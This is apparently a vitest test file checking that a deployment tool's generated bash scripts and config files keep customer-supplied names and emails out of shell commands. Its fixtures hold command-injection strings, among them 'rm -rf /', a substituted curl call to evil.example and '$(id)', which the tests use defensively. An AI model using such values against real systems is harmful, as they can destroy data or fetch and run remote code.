import { execFileSync } from "node:child_process";
import { expect, test } from "vitest";
import {
  DeploymentConfig,
  MASKED,
  MaskedConfig,
  configFileOf,
  maskedConfigOf,
  mintConfig,
  signInOf,
} from "./config.ts";
import type { DeploymentRecord } from "./records.ts";
import { runScriptOf } from "./runs.ts";

// Free text a customer controls: Cloudflare's account name, and the address they sign in with.
const hostileName = "Acme\nrm -rf / # $(curl evil.example) `id` '\"";
const ISSUER = "https://os.example";
const hostileEmail = "a+$(id)`x`@example.com";
const record: DeploymentRecord = {
  id: "dep_aaaabbbbccccdddd",
  name: "my-iterate",
  accountId: "11111111111111111111111111111111",
  accountName: hostileName,
  connection: "aaaabbbbcccc",
  store: "alchemy-state-store",
  stack: "iterate-my-iterate",
  owner: { sub: "user_aaaabbbbccccddddaaaabbbbccccdddd", email: hostileEmail },
  createdAt: "2026-11-06T12:00:00.000Z",
};
const image = {
  account: "11111111222222223333333344444444",
  secret: "/secrets/cloud-image-source",
  digest: "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
};
const step = { destinationUser: "v1", sourceUser: "v1" };

test("a run's script holds no free text: not the account's name, not the owner's address", () => {
  for (const kind of ["plan", "deploy", "destroy"] as const) {
    const script = runScriptOf(record, kind, 42, image, kind === "destroy" ? undefined : step);
    expect(script).not.toContain("Acme");
    expect(script).not.toContain("$(id)");
    expect(script).not.toContain(hostileEmail);
    expect(script).toContain(
      "export ITERATE_CONFIG_FILE='../../../deployments/dep_aaaabbbbccccdddd/iterate.config.ts'",
    );
    expect(script).toContain(
      `getSecret("/secrets/cloud-cloudflare-aaaabbbbcccc", { field: "accessToken" })`,
    );
  }
});

test("the config file holds the owner's address only as a JSON string, and the secrets core/os reads by path", () => {
  // mintConfig refuses such an address (z.email); the file must hold whatever it is given safely
  const minted = mintConfig(
    { ...record, owner: { ...record.owner, email: "ada@example.test" } },
    ISSUER,
  );
  const config = { ...minted, login: { ...minted.login, allow: [{ email: hostileEmail }] } };
  const file = configFileOf(config, "/work/core/core/os");
  expect(file.split(JSON.stringify(hostileEmail)).join("")).not.toContain(hostileEmail);
  expect(file).toContain(JSON.stringify(hostileEmail));
  expect(file).not.toContain("Acme");
  // the fields behind ITERATE__SECRETS_ENCRYPTION__KEY, ITERATE__ADMIN_BEARER and
  // ITERATE__LOGIN__METHODS__PASSWORD__PASSWORD (core/os/src/iterate-config.ts)
  expect(file).toContain(
    "secretsEncryption: { ...base.secretsEncryption, key: cloud.secretsEncryption.key }",
  );
  expect(file).toContain("adminBearer: cloud.adminBearer");
  expect(JSON.parse(/const cloud = (\{[\s\S]*?\n\});/.exec(file)![1]!)).toEqual(config);
});

test("a deployment made before holds a password, which its config still parses and the browser's masks; a new one has nothing to mask", () => {
  const minted = mintConfig(
    { ...record, owner: { ...record.owner, email: "ada@example.test" } },
    ISSUER,
  );
  const old = DeploymentConfig.parse({
    ...minted,
    login: { ...minted.login, methods: { password: { password: "a".repeat(20) } } },
  });
  expect(MaskedConfig.parse(maskedConfigOf(old))).toMatchObject({
    login: { methods: { password: { password: MASKED } } },
  });
  expect(maskedConfigOf(minted)).toMatchObject({ login: minted.login });
  expect([signInOf(minted), signInOf(old)]).toEqual(["iterate", "password"]);
});

test("a hostile address is refused at minting, and each config gets its own secrets", () => {
  expect(() => mintConfig(record, ISSUER)).toThrow();
  const plain = { ...record, owner: { ...record.owner, email: "ada@example.test" } };
  const [one, two] = [mintConfig(plain, ISSUER), mintConfig(plain, ISSUER)];
  expect(one.secretsEncryption.key).toMatch(/^[0-9a-f]{64}$/);
  expect(one).not.toMatchObject({ secretsEncryption: two.secretsEncryption });
  // the owner signs in through the Cloud's platform alone, and the config holds no password
  expect(one).toMatchObject({ login: { methods: { iterate: { issuer: ISSUER } } } });
  expect(JSON.stringify(one)).not.toMatch(/password/);
  expect(one).toMatchObject({
    cloudflare: { accountId: record.accountId, resourcePrefix: "my-iterate", workersDev: true },
  });
});

test("a deploy, and only a deploy, ends by asking the new Worker's address until it answers", () => {
  const deploy = runScriptOf(record, "deploy", 42, image, step);
  expect(deploy.indexOf("== step check")).toBeGreaterThan(deploy.indexOf("== step alchemy"));
  expect(deploy).toContain('address="https://my-iterate.$sub.workers.dev"');
  expect(runScriptOf(record, "plan", 42, image, step)).not.toContain("== step check");
  // the image is the toolchain's digest: nothing is read from a repository
  expect(deploy).toContain(`digest=${image.digest}`);
  expect(deploy).not.toMatch(/GitOrigin-RevId|api\.github\.com/);
});

test("with no image source a run copies no image and prints no image step, and core's deploy pins none", () => {
  for (const kind of ["plan", "deploy"] as const) {
    const script = runScriptOf(record, kind, 42, null, undefined);
    execFileSync("bash", ["-n"], { input: script });
    expect(script).not.toContain("== step image");
    expect(script).not.toMatch(/crane|registry\.cloudflare\.com|image-preparations/);
    expect(script).toContain("export ITERATE_IMAGE_PINS='{}'");
    expect(script.indexOf("== step build")).toBeGreaterThan(script.indexOf("== step namespace"));
  }
  // with an image source the copy is a step of its own, between the namespace and the build
  const copying = runScriptOf(record, "deploy", 42, image, step);
  expect(copying.indexOf("== step image")).toBeGreaterThan(copying.indexOf("== step namespace"));
  expect(copying.indexOf("== step build")).toBeGreaterThan(copying.indexOf("== step image"));
});

test("each script is valid bash, and a destroy, and only a destroy, ends by deleting the namespace the install made", () => {
  for (const kind of ["plan", "deploy", "destroy"] as const)
    execFileSync("bash", ["-n"], {
      input: runScriptOf(record, kind, 42, image, kind === "destroy" ? undefined : step),
    });
  const destroy = runScriptOf(record, "destroy", 42, null, undefined);
  expect(destroy.indexOf("== step repos")).toBeGreaterThan(destroy.indexOf("== step alchemy"));
  expect(destroy).toContain("/artifacts/namespaces/my-iterate-repos");
  expect(runScriptOf(record, "deploy", 42, image, step)).not.toContain("== step repos");
});
